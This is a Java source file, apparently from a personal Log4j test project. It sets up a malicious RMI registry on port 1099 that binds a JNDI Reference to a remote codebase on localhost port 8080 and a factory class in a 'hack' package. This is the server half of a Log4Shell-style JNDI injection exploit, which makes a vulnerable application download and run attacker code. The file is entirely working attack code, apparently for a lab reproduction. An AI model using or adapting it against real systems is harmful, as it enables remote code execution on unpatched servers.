package cn.leon.testlog4j.rmi;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;

public class RmiServer {
    public static void main(String[] args) {
        try {
            Reference reference = new Reference("cn.leon.testlog4j.hack.RmiExecute","cn.leon.testlog4j.hack.RmiExecute","http://127.0.0.1:8080/");
            ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
            LocateRegistry.createRegistry(1099).bind("cc",referenceWrapper);
        } catch (RemoteException | AlreadyBoundException | NamingException e) {
            e.printStackTrace();
        }
    }
}
